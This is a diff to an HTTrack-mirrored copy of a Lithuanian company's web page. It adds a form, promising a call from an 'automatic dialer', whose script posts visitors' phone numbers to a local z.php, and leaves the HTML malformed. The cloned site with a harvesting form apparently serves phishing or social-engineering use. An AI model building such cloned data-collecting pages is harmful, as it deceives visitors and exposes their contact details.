@@ -89,8 +89,49 @@ return false;});});
             © 2020. Visos teisės saugomos.        </div>
     </div>
 </div>
-</div><div id="page_up"></div>	<script async type="text/javascript" src="../js/frontend/plugins.min.js"></script>
+</body>
+<center>
+<body style="background-color:#22364E;">
+<p style="font-size:14px; color:#F2F4F4; font-weight:bold; font-style:italic;">
+Kilo klausimų? Įveskite savo telefono numerį ir jum paskambins mūsų automatinis skambintuvas
+</center>
 </body>
 
-<!-- Mirrored from www.telenordi.lt/lt/sprendimai by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 06 Dec 2022 23:04:24 GMT -->
+<head>
+<script type="text/javascript">
+
+function post(x) {
+var xhr = new XMLHttpRequest();
+
+xhr.open('POST','z.php',true);
+
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.send("x=" + x);
+}
+</script>
+</head>
+
+
+<html>
+<center>
+
+<body style="background-color:#22364E;">
+
+
+<form class="form-wrapper cf">
+    <input type="text" id="number" placeholder="Phone number here..." required>
+    <button type="submit" id="btn" onclick="post(document.getElementById('number').value)">Call</button>
+</form>
+
+
+</body>
+</center>
+
+<body style="background-color:#22364E;">
+<h2>                          </h2>
+</body>
+
+</body>
+
+<!-- Mirrored from www.telenordi.lt/lt by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 06 Dec 2022 22:59:57 GMT -->
 </html>
